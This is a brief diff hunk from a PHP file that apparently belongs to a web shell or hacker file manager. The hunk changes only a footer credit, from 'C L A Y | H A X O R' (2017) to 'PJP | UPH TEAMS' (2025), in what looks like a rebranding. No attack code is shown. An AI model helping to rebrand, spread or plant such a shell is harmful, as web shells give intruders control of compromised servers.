@@ -269,7 +269,7 @@ if (empty($disfunc)) {
     $disf = "<font color='red'>".$disfunc."</font>";
 }
 function author() {
-    echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2017 &copy; C L A Y | H A X O R</center></td></table><br>";
+    echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2025 &copy; PJP | UPH TEAMS</center></td></table><br>";
     exit();
 }
 
